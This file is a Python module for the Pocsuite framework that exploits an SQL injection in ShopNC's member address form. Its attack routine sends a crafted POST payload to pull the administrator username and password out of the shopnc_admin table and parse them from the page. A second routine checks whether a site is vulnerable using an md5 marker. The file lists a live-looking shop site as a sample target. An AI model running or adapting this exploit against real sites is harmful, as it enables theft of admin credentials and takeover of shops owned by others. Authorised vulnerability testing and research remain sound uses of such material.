#!/usr/bin/env python
# coding: utf-8
import re
import urlparse
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
from pocsuite.lib.utils.require import require_header


class ShopNCPOC(POCBase):
    vulID = '90650'  # ssvid
    version = '1'
    author = ['Dubuqingfeng']
    vulDate = '2016-01-13'
    createDate = '2016-02-03'
    updateDate = '2016-02-03'
    references = ['http://www.sebug.net/vuldb/ssvid-90650']
    name = '_90650_shopnc_2008_place_sql_inj_PoC'
    appPowerLink = 'None'
    appName = 'shopNC'
    appVersion = ''
    vulType = 'SQL Injection'
    desc = '''
        shopNC在member_address.php处存在SQL注入漏洞。其实这与其怪罪于shopnc,还不如说是thinkphp框架的问题，只是shopnc自己没有与时俱进，不知道现在thinkphp框架已经有很多问题了。
        需登陆 pocsuite --cookie "xxxxxxx"
        $_POST['true_name']未过滤
    '''
    samples = ['http://www.ytjfc.com/']

    @require_header('cookie')
    def _attack(self):
        result = {}
        url = urlparse.urljoin(self.url, '/shop/index.php?act=member_address&op=address')
        vul_url = urlparse.urljoin(self.url, '/shop/index.php?act=member_address&op=address&inajax=1')

        payload = "exp&true_name[]=1,1,1,concat(0x7e,(SELECT admin_name FROM shopnc_admin limit 0,1)),concat(0x7e,(SELECT admin_password FROM shopnc_admin limit 0,1)),1,1,1) -- a"
        values = list()
        values.append("form_submit=ok&id=&true_name[]=")
        values.append(payload)
        values.append("&city_id=36&area_id=41&area_info=%E5%8C%97%E4%BA%AC%09%E5%8C%97%E4%BA%AC%E5%B8%82%09%E6%9C%9D%E9%98%B3%E5%8C%BA&address=wrwr&tel_phone=rwrwer&mob_phone=12312344123")
        post_data = "".join(values)

        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        req.post(vul_url, data=post_data, headers=headers)
        res = req.get(url)
        if res.status_code == 200:
            match_result = re.findall(r'~\w*', res.content, re.I | re.M)
            if match_result:
                result['AdminInfo'] = {}
                result['AdminInfo']['Username'] = match_result[0][1:]
                result['AdminInfo']['Password'] = match_result[1][1:]
        return self.parse_attack(result)

    @require_header('cookie')
    def _verify(self):
        result = {}
        url = urlparse.urljoin(self.url, '/shop/index.php?act=member_address&op=address')
        vul_url = urlparse.urljoin(self.url, '/shop/index.php?act=member_address&op=address&inajax=1')

        payload = "exp&true_name[]=1,1,1,1,md5(0x2333333),1,1,1) -- a"
        values = list()
        values.append("form_submit=ok&id=&true_name[]=")
        values.append(payload)
        values.append("&city_id=36&area_id=41&area_info=%E5%8C%97%E4%BA%AC%09%E5%8C%97%E4%BA%AC%E5%B8%82%09%E6%9C%9D%E9%98%B3%E5%8C%BA&address=wrwr&tel_phone=rwrwer&mob_phone=12312344123")
        post_data = "".join(values)

        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        req.post(vul_url, data=post_data, headers=headers)
        res = req.get(url)
        if res.status_code == 200 and '525c6bd8bbf951e6863256456f328265' in res.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
            result['VerifyInfo']['Payload'] = payload
        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(ShopNCPOC)